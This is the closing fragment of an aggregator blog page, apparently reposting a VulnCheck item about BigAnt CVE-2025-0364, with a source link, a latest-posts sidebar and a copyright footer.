Access Intelligence](<a href="https://vulncheck.com/product/initial-access-intelligence">https://vulncheck.com/product/initial-access-intelligence</a>) and [Exploit &amp; Vulnerability Intelligence](<a href="https://vulncheck.com/product/exploit-intelligence">https://vulncheck.com/product/exploit-intelligence</a>) products.\n</p>
<h4 id="source"><a href="https://vulncheck.com/blog/bigant-cve-2025-0364">Source</a></h4>
<!-- raw HTML omitted -->

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/posts/2025-03-20-laser-harp-sets-the-tone/">Laser Harp Sets the Tone</a></li>
				
				<li><a href="/posts/2025-03-20-arduino-device-helps-split-the-g-on-a-p/">Arduino device helps split the G on a pint of Guinness</a></li>
				
				<li><a href="/posts/2025-03-20-the-70-best-early-amazon-spring-sale-ga/">The 70 best early Amazon Spring Sale gaming deals 2025</a></li>
				
				<li><a href="/posts/2025-03-20-tomorrow-and-tomorrow-and-tomorrow-info/">Tomorrow and tomorrow and tomorrow Information security and the Baseball Hall of Fame</a></li>
				
				<li><a href="/posts/2025-03-20-i-found-an-android-phone-that-can-convi/">I found an Android phone that can convince iPhone users to make the switch - and its not a flagship</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
	<a href="https://github.com/Gharib110"><b>Github</b></a>.
	</p>
</footer>

</body>
</html>
